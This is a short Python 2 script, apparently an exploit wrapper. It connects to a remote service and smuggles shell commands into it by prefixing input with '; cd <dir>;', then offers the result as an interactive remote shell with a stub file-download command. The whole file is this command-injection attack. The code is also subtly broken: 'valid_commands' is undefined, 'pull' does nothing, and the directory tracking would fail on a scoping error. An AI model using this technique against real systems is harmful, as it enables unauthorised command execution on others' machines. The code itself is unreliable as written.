from socket import socket
from time import sleep



def execute_command(comm):
    host = "cornerstoneairlines.co"
    port = 45

    s = socket()
    s.connect ((host, port))
    s.recv(1024) # get rid of garbage hello message
    s.send("; cd "+cur_dir +"; "+comm+"\n") # send our command
    result = s.recv(1024)

    return result

help_str = '''
shell: Drop into an interactive shell and allow users to gracefully exit.
pull <remote-path> <local-path>: Download files.
help: Show this menu.
quit: Quit the shell.
'''
cur_dir = '/' # so execute can see it

def pull(remote, local):
    pass

def launch_shell():
    usr_input = 'not exit' # placeholder
    while usr_input != 'exit':
        usr_input = raw_input("> "+cur_dir)
        if 'cd' in usr_input:
            args = usr_input.split(' ')
            if len(args) != 2:
                print('invalid cd')
                continue

            target_dir = args[1]
            if target_dir[0] == '/':
                cur_dir = target_dir
            else:
                cur_dir += '/' + target_dir

        elif usr_input != 'exit':
            print(execute_command(usr_input))

def start_interactive():
    usr_input = 'not quit' #placeholder

    while usr_input != 'quit':
        usr_input = raw_input("> "+cur_dir).split(' ')

        if usr_input[0] not in valid_commands:
            print (help_str)
            continue

        elif usr_input[0] == "shell":
            launch_shell()

        elif usr_input[0] == "pull":
            if len(usr_input) != 3:
                print (help_str)
                continue
            _, remote, local = usr_input
            pull(remote, local)

        elif usr_input[0] == 'help':
            print(help_str)

        #quit works automatically
        


if __name__ == '__main__':
    start_interactive()
